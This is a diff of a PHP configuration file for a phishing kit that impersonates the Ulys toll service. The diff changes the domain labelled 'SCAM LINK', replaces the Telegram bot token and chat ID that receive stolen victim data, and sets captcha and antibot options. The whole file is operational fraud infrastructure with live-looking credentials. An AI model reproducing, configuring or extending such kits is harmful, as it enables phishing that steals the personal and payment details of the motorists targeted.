@@ -6,7 +6,7 @@ define("HCAPTCHA", true); // true or false
 define("SECRETKEY", 'ES_ae07b4bdebbf4769a99fe39744ea9bd1'); // secretkey hcaptcha
 define("SITEKEY", '7fc89984-116e-4efe-a1be-b3cab8640590'); // site key hcaptcha
 
-define("TESTMODE", false); // true or false
+define("TESTMODE", true); // true or false
 define("ANTIBOTPW_API", ''); // ANTIBOT.PW API
 
 define("FLAG", '🎬');
@@ -17,10 +17,10 @@ define("WEBSITE", 'https://account.ulys.com/');
 define("REFUNDPRICE", '6,80');
 
 // SCAM LINK
-define("PANEL", 'https://ulysfr-reactualisation.com');
+define("PANEL", 'https://ulys-peage.help');
 // TELEGRAM BOT REZ CONFIG
-define("TOKEN", '7771307531:AAH5mO1pV1LVv2Mzb8R0jUSvnto_zMPL1_E');
-define("CHATID", '-1002260264381');
+define("TOKEN", '8585046261:AAHoAdv-y_FnvX326YpbUk7045w137zrhcQ');
+define("CHATID", '-5063984367');
 define("NOTIF", true); // true or false
 define("NOTIF_CHATID", CHATID); // Utilise le même chatID pour les notifications
 
@@ -29,3 +29,4 @@ define("BULLET", 'your@email.com');
 
 define("PHONE", false); // true or false
 define("CONTROLLER", true); // true or false
+
